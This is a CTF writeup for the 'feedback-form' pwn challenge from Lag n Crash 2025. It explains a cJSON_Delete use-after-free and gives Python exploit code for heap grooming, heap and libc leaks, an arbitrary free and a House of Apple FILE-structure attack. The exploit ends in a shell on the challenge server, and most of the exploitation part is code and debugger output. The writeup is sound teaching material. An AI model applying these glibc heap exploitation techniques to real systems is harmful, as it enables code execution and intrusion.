@@ -1,0 +1,523 @@
+---
+title: LNC 2025
+date: 2025-07-12
+category: writeups
+excerpt: Writeup for feedback-form
+tags:
+  - pwn
+---
+
+import Challenge from "@components/Challenge.vue";
+
+For Lag n Crash this year, I wrote 2 pwn challenges, `feedback-form` and `Trump
+Dating Simulator`, which were released in waves 1 and 3 respectively. Both
+challenges incorporated some interesting stuff I thought of during my infinite
+admin time in NS, so I hope it was fun and educational for everyone!
+
+> I didn't have much time to do writeups, so I'll update this at some later date
+> Trump Dating Simulator and maybe Utility Pole Revengeance (which I'm also
+> solving atm)
+
+# feedback-form
+
+<Challenge title="feedback-form" solves={0}
+flag='LNC25{"solved":true,"response":"h0pe_y0u_enj0y3d_th3_ctf"}'>
+
+Please give us a 5-star rating!
+
+</Challenge>
+
+Not sure why this challenge had so few solves, did people not want to submit
+feedback? /j
+
+## Analysis
+
+This challenge is all about exploiting the
+[cJSON](https://github.com/DaveGamble/cJSON) struct. All input is parsed as JSON
+objects, and looking at the actions we can perform:
+
+```json
+{"actions": ["get_feedback", "show_feedback"]}
+```
+
+we realize it's quite limited as compared to a normal heap challenge, so
+exploiting the management of the cJSON objects we have control over is key.
+
+The program accepts feedback in the form of this JSON object:
+
+```json
+{
+  "username": "asdf",
+  "ratings": [5, 5, 5]
+}
+```
+
+After submitting feedback, any ratings that are less than 5 will be deleted from
+the object. The object is then stored in a global pointer, which we can view
+later at some point in time. If feedback is submitted again, the previous
+feedback is freed and replaced with the new feedback.
+
+Though source wasn't given, the binary isn't meant to be hard to reverse, and
+the only barrier to reversing might be the absence of the cJSON type, which can
+be easily added in IDA by opening the "Local Types" view under `View > Open
+subviews > Local types` and copy-pasting the type definition from the Github
+repo.
+
+## Vulnerability
+
+Under `get_feedback`, we see the bug in how the non 5-star ratings are
+deleted:
+
+```c
+  for ( i = ObjectItem->child; i; i = i->next )
+  {
+    if ( i->type != 8 || i->valueint <= 4 )
+    {
+      cJSON_Delete(i);
+      return puts(
+               "{\"success\": true, \"message\": \"any ratings less than 5 stars have been removed, thank you for your va"
+               "lued feedback\"}");
+    }
+  }
+```
+
+It's hard to notice just by reading the decompilation, because this usage of
+`cJSON_Delete` doesn't seem suspicious at all. However, if we try viewing the
+feedback after submitting a feedback with non-5-star ratings, the program will
+crash. This should hopefully lead us to investigate how `cJSON_Delete` works,
+and why it shouldn't be used on children objects.
+
+```c
+_int64 *__fastcall cJSON_Delete(cJSON *a1)
+{
+  __int64 *result; // rax
+  __int64 *next; // [rsp+18h] [rbp-8h]
+
+  while ( a1 )
+  {
+    next = (__int64 *)a1->next;
+    if ( (a1->type & 0x100) == 0 && a1->child )
+      cJSON_Delete(a1->child);
+    if ( (a1->type & 0x100) == 0 && a1->valuestring )
+    {
+      (*(&global_hooks + 1))(a1->valuestring);
+      a1->valuestring = 0LL;
+    }
+    if ( (a1->type & 0x200) == 0 )
+    {
+      if ( a1->string )
+      {
+        (*(&global_hooks + 1))(a1->string);
+        a1->string = 0LL;
+      }
+    }
+    (*(&global_hooks + 1))(a1);
+    result = next;
+    a1 = (cJSON *)next;
+  }
+  return result;
+}
+```
+
+We can see that the implementation will loop through and delete all items of an
+object's linked list. However, it doesn't actually go back to the previous item
+in the linked list, which means that deleting a child object instead of the root
+parent object will likely result in UAF.
+
+## Upgrading the UAF
+
+Let's take a look at our new and shiny UAF object.
+
+```c
+typedef struct cJSON
+{
+    /* next/prev allow you to walk array/object chains. Alternatively, use GetArraySize/GetArrayItem/GetObjectItem */
+    struct cJSON *next;
+    struct cJSON *prev;
+    /* An array or object item will have a child pointer pointing to a chain of the items in the array/object. */
+    struct cJSON *child;
+
+    /* The type of the item, as above. */
+    int type;
+
+    /* The item's string, if type==cJSON_String  and type == cJSON_Raw */
+    char *valuestring;
+    /* writing to valueint is DEPRECATED, use cJSON_SetNumberValue instead */
+    int valueint;
+    /* The item's number, if type==cJSON_Number */
+    double valuedouble;
+
+    /* The item's name string, if this item is the child of, or is in the list of subitems of an object. */
+    char *string;
+} cJSON;
+```
+
+As can be seen, the next and prev pointers overlap with the fd and bk pointers
+of freed chunks, which is most likely what caused our program to crash - the
+`cJSON_PrintUnformatted` function tries to dereference the encrypted fd pointer
+of a tcache chunk and SIGSEGVs. There are quite a few other fields from which we
+can possibly get our leak from, like valuestring, valueint etc. Unfortunately,
+we see that when creating a new cJSON object, the entire object is cleared
+before being used:
+
+```c
+void *__fastcall cJSON_New_Item(__int64 (__fastcall **a1)(__int64))
+{
+  void *s; // [rsp+18h] [rbp-8h]
+
+  s = (void *)(*a1)(64LL);
+  if ( s )
+    memset(s, 0, 0x40uLL);
+  return s;
+}
+```
+
+Therefore, in order to get these fields to leak some heap/libc pointers, we
+either need to overwrite them using the UAF, or groom the heap such that the
+start of an unsorted chunk lies exactly 0x10 before a field we want to use to
+leak. Since we don't have any leaks, only the latter option is viable for now
+(we can use the former for a secondary leak later).
+
+## Seeding the heap
+
+Tcache chunks aren't useful for our leak at the moment, as its only leak via the
+fd pointer is encrypted and hence can't be dereferenced, but it doesn't align
+with valueint, so we basically can't use it as a leak. In addition, it's much
+easier to do the feng shui with an unsorted chunk instead, as it can be split
+into remainder chunks when serving allocation requests smaller than its size.
+This allows us to adjust the position of the main_arena pointer very precisely,
+by allocating a smaller chunk of a specific size, without having to do too much
+feng shui.
+
+Having said that, we should want to move our tcache/fastbin size allocations to
+a common area so that they don't interfere with our desired unsorted chunks. We
+can do this by "seeding" the heap with enough chunks of required sizes. This
+way, they'll be already allocated and freed on the heap, and will be reused for
+future requests, leaving our desired fastbin/unsorted chunks contiguous and intact.
+
+```python
+def seed_heap_for_fengshui():
+    # we can use strings to get custom sizes too
+    json_payload = {
+      "a": ["a"*(seeded_size), 1, 2, 3]
+    }
+    payload = json.dumps(json_payload).encode()
+    p.sendlineafter(b">", payload)
+```
+
+We can always modify this seeding process later to suit our needs. Now, let's
+create the UAF and try to align unsorted pointers with valuestr.
+
+## Getting a heap leak
+
+```python
+seeded_size = 0x510
+def create_freed_chunks():
+    p.sendlineafter(b">", b'{"action": 0}')
+
+    json_payload = {
+        "ratings": [
+            {"a"*0x40: ["a"*(seeded_size), 7, 7, 7, 7, 7, 7, 7]}
+        ],
+        "username": "b"*0x8
+    }
+    payload = json.dumps(json_payload).encode()
+    p.sendlineafter(b">", payload)
+
+def perform_heap_leak():
+    # do initial alloc to put main_arena pointers at uaf.valuestring
+    payload = b'"'
+    payload += b"a"*(0x4d0)
+    payload += b'"'
+    p.sendlineafter(b">", payload)
+
+    misalign_payload = b"a"*0x4c0
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0010" + b"\\u0000" * 6
+
+    json_payload = {
+        "action": 1,
+        "DEADBEEF": 1,
+    }
+    payload = json.dumps(json_payload).encode()
+    payload = payload.replace(b"DEADBEEF", misalign_payload)
+
+    p.clean()
+    p.sendline(payload)
+```
+
+In `create_freed_chunks(){:python}`, we create a really long string of length
+0x510. This string will be freed since its type doesn't match the cJSON_Number
+type. We'll be using this for our UAF.
+
+Between `create_freed_chunks(){:python}` and `perform_heap_leak(){:python}`,
+let's inspect the heap state.
+
+```ansi
+[32mFree chunk (largebins)[39m | [33mPREV_INUSE[39m
+Addr: [34m0x555555572400[39m
+Size: 0x420 (with flag bits: 0x421)
+[91mfd[39m: 0x155555403f10
+[91mbk[39m: 0x155555403f10
+[91mfd_nextsize[39m: 0x555555572400
+[91mbk_nextsize[39m: 0x555555572400
+
+[32mFree chunk (fastbins)[39m
+Addr: [34m0x555555572820[39m
+Size: 0x50 (with flag bits: 0x50)
+[91mfd[39m: 0x5550000276c2
+
+[32mFree chunk (unsortedbin)[39m | [33mPREV_INUSE[39m
+Addr: [34m0x555555572870[39m
+Size: 0x520 (with flag bits: 0x521)
+[91mfd[39m: 0x555555572f20
+[91mbk[39m: 0x155555403b20
+```
+
+These are our 2 large string chunks, separated by our freed UAF object, at
+0x555555572820. Since they're separated by a fastbin chunk, we can merge them
+together using `malloc_consolidate` to form 1 really large unsorted chunk. Then,
+we'll use this chunk and align the UAF over its main_arena pointers.
+
+
+```python
+def perform_heap_leak():
+    # do initial alloc to put main_arena pointers at uaf.valuestring
+    payload = b'"'
+    payload += b"a"*(0x4d0)
+    payload += b'"'
+    p.sendlineafter(b">", payload)
+
+    misalign_payload = b"a"*0x4c0
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0010" + b"\\u0000" * 6
+
+    json_payload = {
+        "action": 1,
+        "DEADBEEF": 1,
+    }
+    payload = json.dumps(json_payload).encode()
+    payload = payload.replace(b"DEADBEEF", misalign_payload)
+
+    p.clean()
+    p.sendline(payload)
+```
+
+In `perform_heap_leak(){:python}`, we allocate a string that is larger than the
+unsorted chunk, which triggers `malloc_consolidate` coalescing all our chunks
+together. This chunk is immediately freed, which returns it back to the
+coalesced chunk, forming a chunk of size 0xad0.
+
+```ansi
+[32mFree chunk (unsortedbin)[39m | [33mPREV_INUSE[39m
+Addr: [34m0x555555572360[39m
+Size: 0xa30 (with flag bits: 0xa31)
+[91mfd[39m: 0x155555403b20
+[91mbk[39m: 0x155555403b20
+```
+
+Now, we allocate a string that is just short enough such that the remainder
+chunk starts exactly at valuestring-0x10 of our UAF string (which was the 0x50
+fastbin chunk from earlier), causing main_arena pointer to be placed at
+`uaf->valuestring{:c}`. Since we also did the `view_feedback` action when
+writing to our UAF, the JSON object will be immediately printed, with our UAF
+object now a JSON string pointing to main_arena, with its contents being a heap
+leak. Additionally, since we can now control the next pointer of the UAF object,
+we can set it to NULL to prevent the program from reaching non-dereferencable
+tcache chunks.
+
+```ansi
+{"action": "show_feedback"}
+{"ratings":["[91m\xb0q,H\xb9X[39m"],"username":"bbbbbbbb"}
+{"actions": ["get_feedback", "show_feedback"]}
+/* example input */ {"action": 0}
+> 
+```
+
+## Arbitrary read
+
+It's trivial to do our libc leak now, because we can directly overwrite an
+address with some other address on the heap. Recalling the state of the heap,
+the objects we allocated earlier should now be freed. However, we notice that we
+now have tcache chunks between our previously consolidated unsorted chunk, but
+it's not so important now that we can overwrite addresses.
+
+```ansi
+[32mFree chunk (unsortedbin)[39m | [33mPREV_INUSE[39m
+Addr: [34m0x555555572360[39m
+Size: 0x570 (with flag bits: 0x571)
+[91mfd[39m: 0x5555555729e0
+[91mbk[39m: 0x155555403b20
+
+[32mFree chunk (tcachebins)[39m
+Addr: [34m0x5555555728d0[39m
+Size: 0x40 (with flag bits: 0x40)
+[91mfd[39m: 0x555555572
+
+[32mFree chunk (tcachebins)[39m | [33mPREV_INUSE[39m
+Addr: [34m0x555555572910[39m
+Size: 0xd0 (with flag bits: 0xd1)
+[91mfd[39m: 0x555555572
+
+[32mFree chunk (unsortedbin)[39m | [33mPREV_INUSE[39m
+Addr: [34m0x5555555729e0[39m
+Size: 0x3b0 (with flag bits: 0x3b1)
+[91mfd[39m: 0x155555403b20
+[91mbk[39m: 0x555555572360
+```
+
+Recalling that our UAF object is still at 0x555555572820, we can use the first
+unsorted chunk to fake our object. However, we need to be careful that the total
+length of the encoded string doesn't exceed 0x560 bytes, if not the string won't
+be allocated from the correct chunk.
+
+```python
+def perform_libc_leak():
+    assert heap_leak != 0x0
+
+    misalign_payload = b"b"*0x4c0
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"b" * 8
+    misalign_payload += b"\\u0000" * 8
+    misalign_payload += b"\\u0010" + b"\\u0000" * 7
+    misalign_payload += cjson_pack(heap_leak - 0x78)
+
+    json_payload = {
+        "action": 1,
+        "DEADBEEF": 1,
+    }
+    payload = json.dumps(json_payload).encode()
+    payload = payload.replace(b"DEADBEEF", misalign_payload)
+
+    p.clean()
+    p.sendline(payload)
+```
+
+## Arbitrary free and win
+
+With a libc leak, our exploit is almost complete. Using the same UAF object, we
+attack its child pointer for an arbitrary free, making it point to a fake cJSON
+object of our own. This cJSON object will be passed to `cJSON_Delete`, where
+both itself and its valuestring will be freed. If we make its valuestring point
+to some region within itself, we will then have overlapping chunks which can be
+used for our arb write.
+
+```python
+def arb_free():
+    assert heap_leak != 0x0
+
+    fake_obj_addr = heap_leak - 0xe20
+
+    misalign_payload_0  = b""
+    misalign_payload_0 += b"c"*8
+    misalign_payload_0 += b"c"*8
+    misalign_payload_0 += b"\\u0000" * 8
+    misalign_payload_0 += b"\\u0001" + b"\\u0002" + b"\\u0000" * 6 # fake chunk
+    misalign_payload_0 += b"\\u0000" * 8 # next
+    misalign_payload_0 += b"c" * 8
+    misalign_payload_0 += b"\\u0000" * 8 # child
+    misalign_payload_0 += b"\\u0000" + b"\\u0002" + b"\\u0000" * 6 # type = cJSON_String
+    misalign_payload_0 += cjson_pack(heap_leak - 0xdf0) # valuestring
+    misalign_payload_0 += b"\\u0001" + b"\\u0002" + b"\\u0000" * 6 # fake chunk
+    misalign_payload_0 += b"c" * 8
+    misalign_payload_0 += b"c" * 8
+    misalign_payload_0 += cjson_pack(0x0) # string
+    misalign_payload_0 += b"c"*(0x4c0 + 0x20 - len(misalign_payload_0))
+
+    misalign_payload_1  = b""
+    misalign_payload_1 += b"d" * 0x8
+    misalign_payload_1 += cjson_pack(0x51)
+    misalign_payload_1 += cjson_pack(fake_obj_addr)
+    misalign_payload_1 += b"d" * 8
+    misalign_payload_1 += cjson_pack(0x0)
+    misalign_payload_1 += cjson_pack(0x300)
+    misalign_payload_1 += b"d" * (0xb0 - len(misalign_payload_1))
+
+    json_payload = {
+        "action": 0,
+        "DEADBEEF": "CAFEBABE",
+    }
+
+    payload = json.dumps(json_payload).encode()
+    payload = payload.replace(b"DEADBEEF", misalign_payload_0)
+    payload = payload.replace(b"CAFEBABE", misalign_payload_1)
+    p.sendlineafter(b">", payload)
+
+    p.sendlineafter(b">", b"a")
+
+def house_of_apple():
+    assert libc.address != 0x0 and heap_leak != 0x0
+
+    stdout_addr = libc.address + 0x2045c0
+
+    # overwrite fd pointer of overlapping 0x200 chunk
+    payload_0  = b""
+    payload_0 += b"e"*0x18
+    payload_0 += cjson_pack(0x201)
+    payload_0 += cjson_pack(fastbin_encrypt(heap_leak - 0xe20, stdout_addr))
+    payload_0 += b"e"*(0x400 - len(payload_0))
+
+    json_payload = {
+        "action": 0,
+        "DEADBEEF": 1
+    }
+    payload = json.dumps(json_payload).encode()
+    payload = payload.replace(b"DEADBEEF", payload_0)
+    p.sendlineafter(b">", payload)
+
+    wide_data_addr = heap_leak - 0xe20
+
+    wide_data  = b""
+    wide_data += cjson_pack(libc.sym.system)
+    wide_data += b"w"*(0x18 - 0x0 - 0x8)
+    wide_data += cjson_pack(0x0)
+    wide_data += b"w"*(0x30 - 0x18 - 0x8)
+    wide_data += cjson_pack(0x0)
+    wide_data += b"w"*(0xe0 - 0x30 - 0x8)
+    wide_data += cjson_pack(wide_data_addr - 0x68)
+    wide_data += b"w"*(0x200 - len(wide_data))
+
+    wfile_jumps = libc.address + 0x202228
+
+    fake_file  = b""
+    fake_file += cjson_pack(u64(b"  sh".ljust(8, b"\x00")))
+    fake_file += b"f"*(0x20 - 0x0 - 0x8)
+    fake_file += cjson_pack(0x0)
+    fake_file += cjson_pack(0x1)
+    fake_file += b"f"*(0x88 - 0x28 - 0x8)
+    fake_file += cjson_pack(heap_leak)
+    fake_file += b"f"*(0xa0 - 0x88 - 0x8)
+    fake_file += cjson_pack(wide_data_addr)
+    fake_file += b"f"*(0xc0 - 0xa0 - 0x8)
+    fake_file += cjson_pack(0x0)
+    fake_file += b"f"*(0xd8 - 0xc0 - 0x8)
+    fake_file += cjson_pack(wfile_jumps)
+    fake_file += b"f"*(0x210 - len(fake_file))
+
+    json_payload = {
+        "DEADBEEF": "CAFEBABE"
+    }
+    payload = json.dumps(json_payload).encode()
+    payload = payload.replace(b"DEADBEEF", wide_data)
+    payload = payload.replace(b"CAFEBABE", fake_file)
+    print(payload)
+
+    p.sendlineafter(b">", payload)
+ ```
+
+```ansi
+[+] Opening connection to chal1.lagncra.sh on port 8546: Done
+0x60faf79261b0
+0x7999a542f000
+b'{"PwH\xa5\x99y\\u0000\\u0000wwwwwwwwwwwwwwww\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000wwwwwwwwwwwwwwww\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww(S\x92\xf7\xfa`\\u0000\\u0000wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww": "  sh\\u0000\\u0000\\u0000\\u0000ffffffffffffffffffffffff\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0001\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\xb0a\x92\xf7\xfa`\\u0000\\u0000ffffffffffffffff\x90S\x92\xf7\xfa`\\u0000\\u0000ffffffffffffffffffffffff\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000ffffffffffffffff(\\u0012c\xa5\x99y\\u0000\\u0000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}'
+[*] Switching to interactive mode
+ $ ls
+flag.txt
+run
+$ cat flag.txt
+LNC25{"solved":true,"response":"h0pe_y0u_enj0y3d_th3_ctf"}
+```
